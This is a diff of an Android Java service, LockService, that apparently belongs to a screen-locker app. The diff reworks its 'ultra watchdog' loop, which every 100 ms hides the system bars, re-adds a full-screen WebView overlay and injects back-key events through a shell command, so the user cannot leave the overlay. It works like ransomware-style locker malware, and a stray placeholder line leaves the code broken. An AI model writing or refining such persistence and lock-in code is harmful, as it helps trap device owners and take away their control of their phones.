@@ -10,7 +10,7 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.util.Log;
-import android.view.Choreographer;
+
 import android.view.KeyEvent;
 import android.view.MotionEvent;
 import android.view.View;
@@ -32,8 +32,8 @@ public class LockService extends Service {
     private WindowManager.LayoutParams lp;
     private boolean unlocked = false;
     private Handler handler = new Handler();
-    private Choreographer choreographer;
-    private Choreographer.FrameCallback frameCallback;
+    
+    
 
     @Override
     public void onCreate() {
@@ -164,44 +164,41 @@ public class LockService extends Service {
         });
     }
 
+    private Runnable frameRunnable = new Runnable() {
+        @Override public void run() {
+            if (unlocked) return;
+            try {
+                if (webView != null) {
+                    webView.setSystemUiVisibility(
+                        View.SYSTEM_UI_FLAG_FULLSCREEN
+                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
+                        | View.SYSTEM_UI_FLAG_LOW_PROFILE
+                    );
+                    try {
+                        wm.updateViewLayout(webView, lp);
+                    } catch (Exception ignored) {}
+                }
+                try {
+                    Runtime.getRuntime().exec(
+                        new String[]{"input", "keyevent", "4"});
+                } catch (Exception ignored) {}
+            } catch (Exception ignored) {}
+            handler.postDelayed(this, 100);
+        }
+    };
+
     private void startUltraWatchdog() {
         try {
-            choreographer = Choreographer.getInstance();
-            frameCallback = new Choreographer.FrameCallback() {
-                @Override
-                public void doFrame(long frameTimeNanos) {
-                    if (unlocked) return;
-                    try {
-                        if (webView != null) {
-                            webView.setSystemUiVisibility(
-                                View.SYSTEM_UI_FLAG_FULLSCREEN
-                                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
-                                | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
-                                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
-                                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
-                                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
-                                | View.SYSTEM_UI_FLAG_LOW_PROFILE
-                            );
-                            try {
-                                wm.updateViewLayout(webView, lp);
-                            } catch (Exception ignored) {}
-                        }
-                        try {
-                            Runtime.getRuntime().exec(
-                                new String[]{"input", "keyevent", "4"});
-                        } catch (Exception ignored) {}
-                    } catch (Exception ignored) {}
-
-                    if (!unlocked && choreographer != null) {
-                        choreographer.postFrameCallback(this);
-                    }
-                }
-            };
-            choreographer.postFrameCallback(frameCallback);
+            handler.postDelayed(frameRunnable, 100);
         } catch (Exception e) {
             Log.e(TAG, "watchdog error: " + e.getMessage());
         }
     }
+WATCHDOG_PLACEHOLDER
 
     private void instantReAdd() {
         try {
